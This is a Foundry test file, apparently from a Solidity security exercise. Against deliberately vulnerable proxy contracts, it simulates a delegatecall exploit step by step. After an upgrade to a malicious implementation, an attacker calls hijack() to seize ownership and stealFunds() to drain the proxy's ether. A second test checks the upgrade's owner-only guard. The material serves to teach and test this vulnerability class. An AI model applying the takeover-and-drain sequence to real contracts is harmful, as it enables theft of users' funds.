// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableProxy, SafeLogic, MaliciousLogic} from "../../src/External_Call/VulnerableProxy.sol";

contract DelegateCallExploitTest is Test {
    VulnerableProxy public proxy;
    SafeLogic public safeLogic;
    MaliciousLogic public maliciousLogic;
    
    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 5 ether);

        safeLogic = new SafeLogic();
        maliciousLogic = new MaliciousLogic();

        vm.prank(owner);
        proxy = new VulnerableProxy{value: 1 ether}(address(safeLogic));
    }

    function test_DelegateCallExploit() public {
        // 1. Initial state - owner controls proxy
        assertEq(proxy.owner(), owner);
        assertEq(proxy.implementation(), address(safeLogic));
        assertEq(proxy.getBalance(), 1 ether);

        // 2. Owner accidentally upgrades to malicious contract
        vm.prank(owner);
        proxy.upgradeImplementation(address(maliciousLogic));
        assertEq(proxy.implementation(), address(maliciousLogic));

        // 3. Attacker exploits delegatecall to take over proxy
        bytes memory hijackCall = abi.encodeWithSignature("hijack()");
        vm.prank(attacker);
        (bool success, ) = address(proxy).call(hijackCall);
        assertTrue(success, "Hijack should succeed");

        // 4. Verify attacker now owns the proxy
        assertEq(proxy.owner(), attacker, "Attacker should now be owner");

        // 5. Attacker demonstrates control by modifying proxy state
        bytes memory setValueCall = abi.encodeWithSignature("setValueToProveExploit(uint256)", 999);
        vm.prank(attacker);
        (success, ) = address(proxy).call(setValueCall);
        assertTrue(success, "Set value should succeed");
        assertEq(proxy.value(), 999, "Proxy value should be changed by attacker");

        // 6. Attacker steals all funds from proxy
        bytes memory stealCall = abi.encodeWithSignature("stealFunds()");
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialProxyBalance = proxy.getBalance();
        
        vm.prank(attacker);
        (success, ) = address(proxy).call(stealCall);
        assertTrue(success, "Steal funds should succeed");

        // 7. Verify funds were stolen
        assertEq(proxy.getBalance(), 0, "Proxy should be drained");
        assertEq(
            attacker.balance, 
            initialAttackerBalance + initialProxyBalance, 
            "Attacker should receive all funds"
        );
    }

    function test_UpgradeProtection() public {
        // Only owner can upgrade implementation
        vm.prank(attacker);
        vm.expectRevert("Not owner");
        proxy.upgradeImplementation(address(maliciousLogic));
    }
}